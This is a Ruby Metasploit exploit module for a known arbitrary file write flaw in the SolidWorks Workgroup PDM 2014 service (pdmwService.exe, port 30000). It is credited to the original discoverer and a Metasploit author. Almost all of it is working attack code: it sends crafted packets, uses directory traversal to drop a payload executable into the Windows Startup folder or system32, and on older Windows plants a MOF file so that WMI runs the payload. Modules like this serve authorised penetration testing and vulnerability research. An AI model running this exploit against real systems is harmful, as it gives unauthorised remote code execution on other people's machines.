##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'SolidWorks Workgroup PDM 2014 pdmwService.exe Arbitrary File Write',
      'Description'    => %q{
        This module exploits a remote arbitrary file write vulnerability in
        SolidWorks Workgroup PDM 2014 SP2 and prior.

        For targets running Windows Vista or newer the payload is written to the
        startup folder for all users and executed upon next user logon.

        For targets before Windows Vista code execution can be achieved by first
        uploading the payload as an exe file, and then upload another mof file,
        which schedules WMI to execute the uploaded payload.

        This module has been tested successfully on SolidWorks Workgroup PDM
        2011 SP0 on Windows XP SP3 (EN) and Windows 7 SP1 (EN).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Mohamed Shetta <mshetta[at]live.com>', # Initial discovery and PoC
          'Brendan Coles <bcoles[at]gmail.com>',  # Metasploit
        ],
      'References'     =>
        [
          ['EDB',   '31831'],
          ['OSVDB', '103671']
        ],
      'Payload'        =>
        {
          'BadChars'   => "\x00"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested on:
          # - SolidWorks Workgroup PDM 2011 SP0 (Windows XP SP3 - EN)
          # - SolidWorks Workgroup PDM 2011 SP0 (Windows 7 SP1 - EN)
          ['Automatic', { 'auto' => true } ], # both
          ['SolidWorks Workgroup PDM <= 2014 SP2 (Windows XP SP0-SP3)', {}],
          ['SolidWorks Workgroup PDM <= 2014 SP2 (Windows Vista onwards)', {}],
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Feb 22 2014',
      'DefaultTarget'  => 0))

    register_options([
      OptInt.new('DEPTH', [true, 'Traversal depth', 10]),
      Opt::RPORT(30000)
    ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  #
  # Check
  #
  def check
    # op code
    req  = "\xD0\x07\x00\x00"
    # filename length
    req << "\x00\x00\x00\x00"
    # data length
    req << "\x00\x00\x00\x00"
    connect
    sock.put req
    res = sock.get_once
    disconnect
    if !res
      vprint_error "#{peer} - Connection failed."
      Exploit::CheckCode::Unknown
    elsif res == "\x00\x00\x00\x00"
      vprint_status "#{peer} - Received reply (#{res.length} bytes)"
      Exploit::CheckCode::Detected
    else
      vprint_warning "#{peer} - Unexpected reply (#{res.length} bytes)"
      Exploit::CheckCode::Safe
    end
  end

  #
  # Send a file
  #
  def upload(fname, data)
    # every character in the filename must be followed by 0x00
    fname = fname.scan(/./).join("\x00") + "\x00"
    # op code
    req  = "\xD0\x07\x00\x00"
    # filename length
    req << "#{[fname.length].pack('l')}"
    # file name
    req << "#{fname}"
    # data length
    req << "#{[data.length].pack('l')}"
    # data
    req << "#{data}"
    connect
    sock.put req
    res = sock.get_once
    disconnect
    if !res
      fail_with(Failure::Unknown, "#{peer} - Connection failed.")
    elsif res == "\x00\x00\x00\x00"
      print_status "#{peer} - Received reply (#{res.length} bytes)"
    else
      print_warning "#{peer} - Unexpected reply (#{res.length} bytes)"
    end
  end

  #
  # Exploit
  #
  def exploit
    depth    = '..\\' * datastore['DEPTH']
    exe      = generate_payload_exe
    exe_name = "#{rand_text_alpha(rand(10) + 5)}.exe"
    if target.name =~ /Automatic/ or target.name =~ /Vista/
      print_status("#{peer} - Writing EXE to startup for all users (#{exe.length} bytes)")
      upload("#{depth}\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\#{exe_name}", exe)
    end
    if target.name =~ /Automatic/ or target.name =~ /XP/
      print_status("#{peer} - Sending EXE (#{exe.length} bytes)")
      upload("#{depth}\\WINDOWS\\system32\\#{exe_name}", exe)
      mof_name = "#{rand_text_alpha(rand(10) + 5)}.mof"
      mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
      print_status("#{peer} - Sending MOF (#{mof.length} bytes)")
      upload("#{depth}\\WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
      register_file_for_cleanup("wbem\\mof\\good\\#{::File.basename(mof_name)}")
    end
    register_file_for_cleanup("#{::File.basename(exe_name)}")
  end
end